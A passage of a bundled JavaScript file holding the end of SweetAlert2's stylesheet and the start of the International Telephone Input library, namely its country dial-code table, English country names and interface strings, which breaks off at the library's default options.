.8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');

},{}],"lXOeg":[function(require,module,exports) {
/*
 * International Telephone Input v24.6.0
 * https://github.com/jackocnr/intl-tel-input.git
 * Licensed under the MIT license
 */ // UMD
(function(factory) {
    if (0, module.exports) module.exports = factory();
    else window.intlTelInput = factory();
})(()=>{
    var factoryOutput = (()=>{
        var __defProp = Object.defineProperty;
        var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
        var __getOwnPropNames = Object.getOwnPropertyNames;
        var __hasOwnProp = Object.prototype.hasOwnProperty;
        var __export = (target, all)=>{
            for(var name in all)__defProp(target, name, {
                get: all[name],
                enumerable: true
            });
        };
        var __copyProps = (to, from, except, desc)=>{
            if (from && typeof from === "object" || typeof from === "function") {
                for (let key of __getOwnPropNames(from))if (!__hasOwnProp.call(to, key) && key !== except) __defProp(to, key, {
                    get: ()=>from[key],
                    enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable
                });
            }
            return to;
        };
        var __toCommonJS = (mod)=>__copyProps(__defProp({}, "__esModule", {
                value: true
            }), mod);
        // src/js/intl-tel-input.ts
        var intl_tel_input_exports = {};
        __export(intl_tel_input_exports, {
            Iti: ()=>Iti,
            default: ()=>intl_tel_input_default
        });
        // src/js/intl-tel-input/data.ts
        var rawCountryData = [
            [
                "af",
                // Afghanistan
                "93"
            ],
            [
                "ax",
                // Åland Islands
                "358",
                1,
                [
                    "18"
                ]
            ],
            [
                "al",
                // Albania
                "355"
            ],
            [
                "dz",
                // Algeria
                "213"
            ],
            [
                "as",
                // American Samoa
                "1",
                5,
                [
                    "684"
                ]
            ],
            [
                "ad",
                // Andorra
                "376"
            ],
            [
                "ao",
                // Angola
                "244"
            ],
            [
                "ai",
                // Anguilla
                "1",
                6,
                [
                    "264"
                ]
            ],
            [
                "ag",
                // Antigua and Barbuda
                "1",
                7,
                [
                    "268"
                ]
            ],
            [
                "ar",
                // Argentina
                "54"
            ],
            [
                "am",
                // Armenia
                "374"
            ],
            [
                "aw",
                // Aruba
                "297"
            ],
            [
                "ac",
                // Ascension Island
                "247"
            ],
            [
                "au",
                // Australia
                "61",
                0
            ],
            [
                "at",
                // Austria
                "43"
            ],
            [
                "az",
                // Azerbaijan
                "994"
            ],
            [
                "bs",
                // Bahamas
                "1",
                8,
                [
                    "242"
                ]
            ],
            [
                "bh",
                // Bahrain
                "973"
            ],
            [
                "bd",
                // Bangladesh
                "880"
            ],
            [
                "bb",
                // Barbados
                "1",
                9,
                [
                    "246"
                ]
            ],
            [
                "by",
                // Belarus
                "375"
            ],
            [
                "be",
                // Belgium
                "32"
            ],
            [
                "bz",
                // Belize
                "501"
            ],
            [
                "bj",
                // Benin
                "229"
            ],
            [
                "bm",
                // Bermuda
                "1",
                10,
                [
                    "441"
                ]
            ],
            [
                "bt",
                // Bhutan
                "975"
            ],
            [
                "bo",
                // Bolivia
                "591"
            ],
            [
                "ba",
                // Bosnia and Herzegovina
                "387"
            ],
            [
                "bw",
                // Botswana
                "267"
            ],
            [
                "br",
                // Brazil
                "55"
            ],
            [
                "io",
                // British Indian Ocean Territory
                "246"
            ],
            [
                "vg",
                // British Virgin Islands
                "1",
                11,
                [
                    "284"
                ]
            ],
            [
                "bn",
                // Brunei
                "673"
            ],
            [
                "bg",
                // Bulgaria
                "359"
            ],
            [
                "bf",
                // Burkina Faso
                "226"
            ],
            [
                "bi",
                // Burundi
                "257"
            ],
            [
                "kh",
                // Cambodia
                "855"
            ],
            [
                "cm",
                // Cameroon
                "237"
            ],
            [
                "ca",
                // Canada
                "1",
                1,
                [
                    "204",
                    "226",
                    "236",
                    "249",
                    "250",
                    "263",
                    "289",
                    "306",
                    "343",
                    "354",
                    "365",
                    "367",
                    "368",
                    "382",
                    "387",
                    "403",
                    "416",
                    "418",
                    "428",
                    "431",
                    "437",
                    "438",
                    "450",
                    "584",
                    "468",
                    "474",
                    "506",
                    "514",
                    "519",
                    "548",
                    "579",
                    "581",
                    "584",
                    "587",
                    "604",
                    "613",
                    "639",
                    "647",
                    "672",
                    "683",
                    "705",
                    "709",
                    "742",
                    "753",
                    "778",
                    "780",
                    "782",
                    "807",
                    "819",
                    "825",
                    "867",
                    "873",
                    "879",
                    "902",
                    "905"
                ]
            ],
            [
                "cv",
                // Cape Verde
                "238"
            ],
            [
                "bq",
                // Caribbean Netherlands
                "599",
                1,
                [
                    "3",
                    "4",
                    "7"
                ]
            ],
            [
                "ky",
                // Cayman Islands
                "1",
                12,
                [
                    "345"
                ]
            ],
            [
                "cf",
                // Central African Republic
                "236"
            ],
            [
                "td",
                // Chad
                "235"
            ],
            [
                "cl",
                // Chile
                "56"
            ],
            [
                "cn",
                // China
                "86"
            ],
            [
                "cx",
                // Christmas Island
                "61",
                2,
                [
                    "89164"
                ]
            ],
            [
                "cc",
                // Cocos (Keeling) Islands
                "61",
                1,
                [
                    "89162"
                ]
            ],
            [
                "co",
                // Colombia
                "57"
            ],
            [
                "km",
                // Comoros
                "269"
            ],
            [
                "cg",
                // Congo (Brazzaville)
                "242"
            ],
            [
                "cd",
                // Congo (Kinshasa)
                "243"
            ],
            [
                "ck",
                // Cook Islands
                "682"
            ],
            [
                "cr",
                // Costa Rica
                "506"
            ],
            [
                "ci",
                // Côte d'Ivoire
                "225"
            ],
            [
                "hr",
                // Croatia
                "385"
            ],
            [
                "cu",
                // Cuba
                "53"
            ],
            [
                "cw",
                // Curaçao
                "599",
                0
            ],
            [
                "cy",
                // Cyprus
                "357"
            ],
            [
                "cz",
                // Czech Republic
                "420"
            ],
            [
                "dk",
                // Denmark
                "45"
            ],
            [
                "dj",
                // Djibouti
                "253"
            ],
            [
                "dm",
                // Dominica
                "1",
                13,
                [
                    "767"
                ]
            ],
            [
                "do",
                // Dominican Republic
                "1",
                2,
                [
                    "809",
                    "829",
                    "849"
                ]
            ],
            [
                "ec",
                // Ecuador
                "593"
            ],
            [
                "eg",
                // Egypt
                "20"
            ],
            [
                "sv",
                // El Salvador
                "503"
            ],
            [
                "gq",
                // Equatorial Guinea
                "240"
            ],
            [
                "er",
                // Eritrea
                "291"
            ],
            [
                "ee",
                // Estonia
                "372"
            ],
            [
                "sz",
                // Eswatini
                "268"
            ],
            [
                "et",
                // Ethiopia
                "251"
            ],
            [
                "fk",
                // Falkland Islands (Malvinas)
                "500"
            ],
            [
                "fo",
                // Faroe Islands
                "298"
            ],
            [
                "fj",
                // Fiji
                "679"
            ],
            [
                "fi",
                // Finland
                "358",
                0
            ],
            [
                "fr",
                // France
                "33"
            ],
            [
                "gf",
                // French Guiana
                "594"
            ],
            [
                "pf",
                // French Polynesia
                "689"
            ],
            [
                "ga",
                // Gabon
                "241"
            ],
            [
                "gm",
                // Gambia
                "220"
            ],
            [
                "ge",
                // Georgia
                "995"
            ],
            [
                "de",
                // Germany
                "49"
            ],
            [
                "gh",
                // Ghana
                "233"
            ],
            [
                "gi",
                // Gibraltar
                "350"
            ],
            [
                "gr",
                // Greece
                "30"
            ],
            [
                "gl",
                // Greenland
                "299"
            ],
            [
                "gd",
                // Grenada
                "1",
                14,
                [
                    "473"
                ]
            ],
            [
                "gp",
                // Guadeloupe
                "590",
                0
            ],
            [
                "gu",
                // Guam
                "1",
                15,
                [
                    "671"
                ]
            ],
            [
                "gt",
                // Guatemala
                "502"
            ],
            [
                "gg",
                // Guernsey
                "44",
                1,
                [
                    "1481",
                    "7781",
                    "7839",
                    "7911"
                ]
            ],
            [
                "gn",
                // Guinea
                "224"
            ],
            [
                "gw",
                // Guinea-Bissau
                "245"
            ],
            [
                "gy",
                // Guyana
                "592"
            ],
            [
                "ht",
                // Haiti
                "509"
            ],
            [
                "hn",
                // Honduras
                "504"
            ],
            [
                "hk",
                // Hong Kong SAR China
                "852"
            ],
            [
                "hu",
                // Hungary
                "36"
            ],
            [
                "is",
                // Iceland
                "354"
            ],
            [
                "in",
                // India
                "91"
            ],
            [
                "id",
                // Indonesia
                "62"
            ],
            [
                "ir",
                // Iran
                "98"
            ],
            [
                "iq",
                // Iraq
                "964"
            ],
            [
                "ie",
                // Ireland
                "353"
            ],
            [
                "im",
                // Isle of Man
                "44",
                2,
                [
                    "1624",
                    "74576",
                    "7524",
                    "7924",
                    "7624"
                ]
            ],
            [
                "il",
                // Israel
                "972"
            ],
            [
                "it",
                // Italy
                "39",
                0
            ],
            [
                "jm",
                // Jamaica
                "1",
                4,
                [
                    "876",
                    "658"
                ]
            ],
            [
                "jp",
                // Japan
                "81"
            ],
            [
                "je",
                // Jersey
                "44",
                3,
                [
                    "1534",
                    "7509",
                    "7700",
                    "7797",
                    "7829",
                    "7937"
                ]
            ],
            [
                "jo",
                // Jordan
                "962"
            ],
            [
                "kz",
                // Kazakhstan
                "7",
                1,
                [
                    "33",
                    "7"
                ]
            ],
            [
                "ke",
                // Kenya
                "254"
            ],
            [
                "ki",
                // Kiribati
                "686"
            ],
            [
                "xk",
                // Kosovo
                "383"
            ],
            [
                "kw",
                // Kuwait
                "965"
            ],
            [
                "kg",
                // Kyrgyzstan
                "996"
            ],
            [
                "la",
                // Laos
                "856"
            ],
            [
                "lv",
                // Latvia
                "371"
            ],
            [
                "lb",
                // Lebanon
                "961"
            ],
            [
                "ls",
                // Lesotho
                "266"
            ],
            [
                "lr",
                // Liberia
                "231"
            ],
            [
                "ly",
                // Libya
                "218"
            ],
            [
                "li",
                // Liechtenstein
                "423"
            ],
            [
                "lt",
                // Lithuania
                "370"
            ],
            [
                "lu",
                // Luxembourg
                "352"
            ],
            [
                "mo",
                // Macao SAR China
                "853"
            ],
            [
                "mg",
                // Madagascar
                "261"
            ],
            [
                "mw",
                // Malawi
                "265"
            ],
            [
                "my",
                // Malaysia
                "60"
            ],
            [
                "mv",
                // Maldives
                "960"
            ],
            [
                "ml",
                // Mali
                "223"
            ],
            [
                "mt",
                // Malta
                "356"
            ],
            [
                "mh",
                // Marshall Islands
                "692"
            ],
            [
                "mq",
                // Martinique
                "596"
            ],
            [
                "mr",
                // Mauritania
                "222"
            ],
            [
                "mu",
                // Mauritius
                "230"
            ],
            [
                "yt",
                // Mayotte
                "262",
                1,
                [
                    "269",
                    "639"
                ]
            ],
            [
                "mx",
                // Mexico
                "52"
            ],
            [
                "fm",
                // Micronesia
                "691"
            ],
            [
                "md",
                // Moldova
                "373"
            ],
            [
                "mc",
                // Monaco
                "377"
            ],
            [
                "mn",
                // Mongolia
                "976"
            ],
            [
                "me",
                // Montenegro
                "382"
            ],
            [
                "ms",
                // Montserrat
                "1",
                16,
                [
                    "664"
                ]
            ],
            [
                "ma",
                // Morocco
                "212",
                0
            ],
            [
                "mz",
                // Mozambique
                "258"
            ],
            [
                "mm",
                // Myanmar (Burma)
                "95"
            ],
            [
                "na",
                // Namibia
                "264"
            ],
            [
                "nr",
                // Nauru
                "674"
            ],
            [
                "np",
                // Nepal
                "977"
            ],
            [
                "nl",
                // Netherlands
                "31"
            ],
            [
                "nc",
                // New Caledonia
                "687"
            ],
            [
                "nz",
                // New Zealand
                "64"
            ],
            [
                "ni",
                // Nicaragua
                "505"
            ],
            [
                "ne",
                // Niger
                "227"
            ],
            [
                "ng",
                // Nigeria
                "234"
            ],
            [
                "nu",
                // Niue
                "683"
            ],
            [
                "nf",
                // Norfolk Island
                "672"
            ],
            [
                "kp",
                // North Korea
                "850"
            ],
            [
                "mk",
                // North Macedonia
                "389"
            ],
            [
                "mp",
                // Northern Mariana Islands
                "1",
                17,
                [
                    "670"
                ]
            ],
            [
                "no",
                // Norway
                "47",
                0
            ],
            [
                "om",
                // Oman
                "968"
            ],
            [
                "pk",
                // Pakistan
                "92"
            ],
            [
                "pw",
                // Palau
                "680"
            ],
            [
                "ps",
                // Palestinian Territories
                "970"
            ],
            [
                "pa",
                // Panama
                "507"
            ],
            [
                "pg",
                // Papua New Guinea
                "675"
            ],
            [
                "py",
                // Paraguay
                "595"
            ],
            [
                "pe",
                // Peru
                "51"
            ],
            [
                "ph",
                // Philippines
                "63"
            ],
            [
                "pl",
                // Poland
                "48"
            ],
            [
                "pt",
                // Portugal
                "351"
            ],
            [
                "pr",
                // Puerto Rico
                "1",
                3,
                [
                    "787",
                    "939"
                ]
            ],
            [
                "qa",
                // Qatar
                "974"
            ],
            [
                "re",
                // Réunion
                "262",
                0
            ],
            [
                "ro",
                // Romania
                "40"
            ],
            [
                "ru",
                // Russia
                "7",
                0
            ],
            [
                "rw",
                // Rwanda
                "250"
            ],
            [
                "ws",
                // Samoa
                "685"
            ],
            [
                "sm",
                // San Marino
                "378"
            ],
            [
                "st",
                // São Tomé & Príncipe
                "239"
            ],
            [
                "sa",
                // Saudi Arabia
                "966"
            ],
            [
                "sn",
                // Senegal
                "221"
            ],
            [
                "rs",
                // Serbia
                "381"
            ],
            [
                "sc",
                // Seychelles
                "248"
            ],
            [
                "sl",
                // Sierra Leone
                "232"
            ],
            [
                "sg",
                // Singapore
                "65"
            ],
            [
                "sx",
                // Sint Maarten
                "1",
                21,
                [
                    "721"
                ]
            ],
            [
                "sk",
                // Slovakia
                "421"
            ],
            [
                "si",
                // Slovenia
                "386"
            ],
            [
                "sb",
                // Solomon Islands
                "677"
            ],
            [
                "so",
                // Somalia
                "252"
            ],
            [
                "za",
                // South Africa
                "27"
            ],
            [
                "kr",
                // South Korea
                "82"
            ],
            [
                "ss",
                // South Sudan
                "211"
            ],
            [
                "es",
                // Spain
                "34"
            ],
            [
                "lk",
                // Sri Lanka
                "94"
            ],
            [
                "bl",
                // St. Barthélemy
                "590",
                1
            ],
            [
                "sh",
                // St. Helena
                "290"
            ],
            [
                "kn",
                // St. Kitts & Nevis
                "1",
                18,
                [
                    "869"
                ]
            ],
            [
                "lc",
                // St. Lucia
                "1",
                19,
                [
                    "758"
                ]
            ],
            [
                "mf",
                // St. Martin
                "590",
                2
            ],
            [
                "pm",
                // St. Pierre & Miquelon
                "508"
            ],
            [
                "vc",
                // St. Vincent & Grenadines
                "1",
                20,
                [
                    "784"
                ]
            ],
            [
                "sd",
                // Sudan
                "249"
            ],
            [
                "sr",
                // Suriname
                "597"
            ],
            [
                "sj",
                // Svalbard & Jan Mayen
                "47",
                1,
                [
                    "79"
                ]
            ],
            [
                "se",
                // Sweden
                "46"
            ],
            [
                "ch",
                // Switzerland
                "41"
            ],
            [
                "sy",
                // Syria
                "963"
            ],
            [
                "tw",
                // Taiwan
                "886"
            ],
            [
                "tj",
                // Tajikistan
                "992"
            ],
            [
                "tz",
                // Tanzania
                "255"
            ],
            [
                "th",
                // Thailand
                "66"
            ],
            [
                "tl",
                // Timor-Leste
                "670"
            ],
            [
                "tg",
                // Togo
                "228"
            ],
            [
                "tk",
                // Tokelau
                "690"
            ],
            [
                "to",
                // Tonga
                "676"
            ],
            [
                "tt",
                // Trinidad & Tobago
                "1",
                22,
                [
                    "868"
                ]
            ],
            [
                "tn",
                // Tunisia
                "216"
            ],
            [
                "tr",
                // Turkey
                "90"
            ],
            [
                "tm",
                // Turkmenistan
                "993"
            ],
            [
                "tc",
                // Turks & Caicos Islands
                "1",
                23,
                [
                    "649"
                ]
            ],
            [
                "tv",
                // Tuvalu
                "688"
            ],
            [
                "ug",
                // Uganda
                "256"
            ],
            [
                "ua",
                // Ukraine
                "380"
            ],
            [
                "ae",
                // United Arab Emirates
                "971"
            ],
            [
                "gb",
                // United Kingdom
                "44",
                0
            ],
            [
                "us",
                // United States
                "1",
                0
            ],
            [
                "uy",
                // Uruguay
                "598"
            ],
            [
                "vi",
                // U.S. Virgin Islands
                "1",
                24,
                [
                    "340"
                ]
            ],
            [
                "uz",
                // Uzbekistan
                "998"
            ],
            [
                "vu",
                // Vanuatu
                "678"
            ],
            [
                "va",
                // Vatican City
                "39",
                1,
                [
                    "06698"
                ]
            ],
            [
                "ve",
                // Venezuela
                "58"
            ],
            [
                "vn",
                // Vietnam
                "84"
            ],
            [
                "wf",
                // Wallis & Futuna
                "681"
            ],
            [
                "eh",
                // Western Sahara
                "212",
                1,
                [
                    "5288",
                    "5289"
                ]
            ],
            [
                "ye",
                // Yemen
                "967"
            ],
            [
                "zm",
                // Zambia
                "260"
            ],
            [
                "zw",
                // Zimbabwe
                "263"
            ]
        ];
        var allCountries = [];
        for(let i = 0; i < rawCountryData.length; i++){
            const c = rawCountryData[i];
            allCountries[i] = {
                name: "",
                // this is now populated in the plugin
                iso2: c[0],
                dialCode: c[1],
                priority: c[2] || 0,
                areaCodes: c[3] || null,
                nodeById: {}
            };
        }
        var data_default = allCountries;
        // src/js/intl-tel-input/i18n/en/countries.ts
        var countryTranslations = {
            ad: "Andorra",
            ae: "United Arab Emirates",
            af: "Afghanistan",
            ag: "Antigua & Barbuda",
            ai: "Anguilla",
            al: "Albania",
            am: "Armenia",
            ao: "Angola",
            ar: "Argentina",
            as: "American Samoa",
            at: "Austria",
            au: "Australia",
            aw: "Aruba",
            ax: "\xc5land Islands",
            az: "Azerbaijan",
            ba: "Bosnia & Herzegovina",
            bb: "Barbados",
            bd: "Bangladesh",
            be: "Belgium",
            bf: "Burkina Faso",
            bg: "Bulgaria",
            bh: "Bahrain",
            bi: "Burundi",
            bj: "Benin",
            bl: "St. Barth\xe9lemy",
            bm: "Bermuda",
            bn: "Brunei",
            bo: "Bolivia",
            bq: "Caribbean Netherlands",
            br: "Brazil",
            bs: "Bahamas",
            bt: "Bhutan",
            bw: "Botswana",
            by: "Belarus",
            bz: "Belize",
            ca: "Canada",
            cc: "Cocos (Keeling) Islands",
            cd: "Congo - Kinshasa",
            cf: "Central African Republic",
            cg: "Congo - Brazzaville",
            ch: "Switzerland",
            ci: "C\xf4te d\u2019Ivoire",
            ck: "Cook Islands",
            cl: "Chile",
            cm: "Cameroon",
            cn: "China",
            co: "Colombia",
            cr: "Costa Rica",
            cu: "Cuba",
            cv: "Cape Verde",
            cw: "Cura\xe7ao",
            cx: "Christmas Island",
            cy: "Cyprus",
            cz: "Czechia",
            de: "Germany",
            dj: "Djibouti",
            dk: "Denmark",
            dm: "Dominica",
            do: "Dominican Republic",
            dz: "Algeria",
            ec: "Ecuador",
            ee: "Estonia",
            eg: "Egypt",
            eh: "Western Sahara",
            er: "Eritrea",
            es: "Spain",
            et: "Ethiopia",
            fi: "Finland",
            fj: "Fiji",
            fk: "Falkland Islands",
            fm: "Micronesia",
            fo: "Faroe Islands",
            fr: "France",
            ga: "Gabon",
            gb: "United Kingdom",
            gd: "Grenada",
            ge: "Georgia",
            gf: "French Guiana",
            gg: "Guernsey",
            gh: "Ghana",
            gi: "Gibraltar",
            gl: "Greenland",
            gm: "Gambia",
            gn: "Guinea",
            gp: "Guadeloupe",
            gq: "Equatorial Guinea",
            gr: "Greece",
            gt: "Guatemala",
            gu: "Guam",
            gw: "Guinea-Bissau",
            gy: "Guyana",
            hk: "Hong Kong SAR China",
            hn: "Honduras",
            hr: "Croatia",
            ht: "Haiti",
            hu: "Hungary",
            id: "Indonesia",
            ie: "Ireland",
            il: "Israel",
            im: "Isle of Man",
            in: "India",
            io: "British Indian Ocean Territory",
            iq: "Iraq",
            ir: "Iran",
            is: "Iceland",
            it: "Italy",
            je: "Jersey",
            jm: "Jamaica",
            jo: "Jordan",
            jp: "Japan",
            ke: "Kenya",
            kg: "Kyrgyzstan",
            kh: "Cambodia",
            ki: "Kiribati",
            km: "Comoros",
            kn: "St. Kitts & Nevis",
            kp: "North Korea",
            kr: "South Korea",
            kw: "Kuwait",
            ky: "Cayman Islands",
            kz: "Kazakhstan",
            la: "Laos",
            lb: "Lebanon",
            lc: "St. Lucia",
            li: "Liechtenstein",
            lk: "Sri Lanka",
            lr: "Liberia",
            ls: "Lesotho",
            lt: "Lithuania",
            lu: "Luxembourg",
            lv: "Latvia",
            ly: "Libya",
            ma: "Morocco",
            mc: "Monaco",
            md: "Moldova",
            me: "Montenegro",
            mf: "St. Martin",
            mg: "Madagascar",
            mh: "Marshall Islands",
            mk: "North Macedonia",
            ml: "Mali",
            mm: "Myanmar (Burma)",
            mn: "Mongolia",
            mo: "Macao SAR China",
            mp: "Northern Mariana Islands",
            mq: "Martinique",
            mr: "Mauritania",
            ms: "Montserrat",
            mt: "Malta",
            mu: "Mauritius",
            mv: "Maldives",
            mw: "Malawi",
            mx: "Mexico",
            my: "Malaysia",
            mz: "Mozambique",
            na: "Namibia",
            nc: "New Caledonia",
            ne: "Niger",
            nf: "Norfolk Island",
            ng: "Nigeria",
            ni: "Nicaragua",
            nl: "Netherlands",
            no: "Norway",
            np: "Nepal",
            nr: "Nauru",
            nu: "Niue",
            nz: "New Zealand",
            om: "Oman",
            pa: "Panama",
            pe: "Peru",
            pf: "French Polynesia",
            pg: "Papua New Guinea",
            ph: "Philippines",
            pk: "Pakistan",
            pl: "Poland",
            pm: "St. Pierre & Miquelon",
            pr: "Puerto Rico",
            ps: "Palestinian Territories",
            pt: "Portugal",
            pw: "Palau",
            py: "Paraguay",
            qa: "Qatar",
            re: "R\xe9union",
            ro: "Romania",
            rs: "Serbia",
            ru: "Russia",
            rw: "Rwanda",
            sa: "Saudi Arabia",
            sb: "Solomon Islands",
            sc: "Seychelles",
            sd: "Sudan",
            se: "Sweden",
            sg: "Singapore",
            sh: "St. Helena",
            si: "Slovenia",
            sj: "Svalbard & Jan Mayen",
            sk: "Slovakia",
            sl: "Sierra Leone",
            sm: "San Marino",
            sn: "Senegal",
            so: "Somalia",
            sr: "Suriname",
            ss: "South Sudan",
            st: "S\xe3o Tom\xe9 & Pr\xedncipe",
            sv: "El Salvador",
            sx: "Sint Maarten",
            sy: "Syria",
            sz: "Eswatini",
            tc: "Turks & Caicos Islands",
            td: "Chad",
            tg: "Togo",
            th: "Thailand",
            tj: "Tajikistan",
            tk: "Tokelau",
            tl: "Timor-Leste",
            tm: "Turkmenistan",
            tn: "Tunisia",
            to: "Tonga",
            tr: "Turkey",
            tt: "Trinidad & Tobago",
            tv: "Tuvalu",
            tw: "Taiwan",
            tz: "Tanzania",
            ua: "Ukraine",
            ug: "Uganda",
            us: "United States",
            uy: "Uruguay",
            uz: "Uzbekistan",
            va: "Vatican City",
            vc: "St. Vincent & Grenadines",
            ve: "Venezuela",
            vg: "British Virgin Islands",
            vi: "U.S. Virgin Islands",
            vn: "Vietnam",
            vu: "Vanuatu",
            wf: "Wallis & Futuna",
            ws: "Samoa",
            ye: "Yemen",
            yt: "Mayotte",
            za: "South Africa",
            zm: "Zambia",
            zw: "Zimbabwe"
        };
        var countries_default = countryTranslations;
        // src/js/intl-tel-input/i18n/en/interface.ts
        var interfaceTranslations = {
            selectedCountryAriaLabel: "Selected country",
            noCountrySelected: "No country selected",
            countryListAriaLabel: "List of countries",
            searchPlaceholder: "Search",
            zeroSearchResults: "No results found",
            oneSearchResult: "1 result found",
            multipleSearchResults: "${count} results found",
            // additional countries (not supported by country-list library)
            ac: "Ascension Island",
            xk: "Kosovo"
        };
        var interface_default = interfaceTranslations;
        // src/js/intl-tel-input/i18n/en/index.ts
        var allTranslations = {
            ...countries_default,
            ...interface_default
        };
        var en_default = allTranslations;
        // src/js/intl-tel-input.ts
        for(let i = 0; i < data_default.length; i++)data_default[i].name = en_default[data_default[i].iso2];
        var id = 0;
        var defaults = {
            //* Whether or not to allow the dropdown.
            allowDropdown: true,
